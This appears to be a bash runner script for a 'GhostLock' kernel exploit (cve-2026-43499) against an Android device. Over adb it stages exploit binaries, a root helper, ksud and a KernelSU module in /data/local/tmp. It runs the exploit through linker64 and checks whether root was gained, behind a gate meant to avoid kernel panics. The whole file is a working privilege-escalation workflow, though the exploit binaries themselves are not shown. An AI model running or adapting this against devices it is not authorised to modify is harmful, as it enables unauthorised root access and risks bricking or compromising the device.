#!/bin/bash
# GhostLock exploit runner for SN512A.
# Requires: kernel/sn512a-target/target.h disasm-verified (see kernel/SN512A_PORT_NOTES.md).
# Gate: only runs if kernel/PORT_VERIFIED flag exists (created after disasm check).

cd "$(dirname "$0")"
LOG="unlock-logs/ghostlock-run-$(date +%Y%m%d-%H%M%S).log"
mkdir -p unlock-logs exploit-out

{
echo "=== GhostLock run $(date) ==="

if [ ! -f kernel/PORT_VERIFIED ]; then
  echo "[ABORT] kernel/PORT_VERIFIED missing — disasm verification incomplete."
  echo "        stack-geometry fields may still carry iQOO values; running blind"
  echo "        risks kernel panic. Remove this gate only after review."
  exit 2
fi

adb get-state 2>/dev/null | grep -q device || { echo "no device"; exit 1; }

echo "[*] staging payload"
adb push exploit/cve-2026-43499 /data/local/tmp/gl.so || exit 1
adb push exploit/cve-2026-43499-root /data/local/tmp/gl-root || exit 1
adb push exploit/ksud /data/local/tmp/ksud-iqoo-z9-5g || exit 1   # path baked into su_daemon
adb push ksu/kernelsu.ko /data/local/tmp/kernelsu.ko || exit 1
adb shell 'chmod 755 /data/local/tmp/gl.so /data/local/tmp/gl-root /data/local/tmp/ksud-iqoo-z9-5g'

echo "[*] uname -r:"; adb shell 'uname -r'

echo "[*] running exploit via linker64 (constructor self-exec)"
timeout 120 adb shell '/system/bin/linker64 /data/local/tmp/gl.so; echo "EXIT=$?"' | tee exploit-out/last.log

echo "[*] checking for root"
adb shell 'id; ls -la /data/local/tmp/*.log 2>/dev/null | tail -5'
adb shell 'cat /data/local/tmp/ksu_*.log /data/local/tmp/ghostlock*.log 2>/dev/null | tail -30'

echo "=== done ==="
} 2>&1 | tee "$LOG"
echo "saved: $LOG"
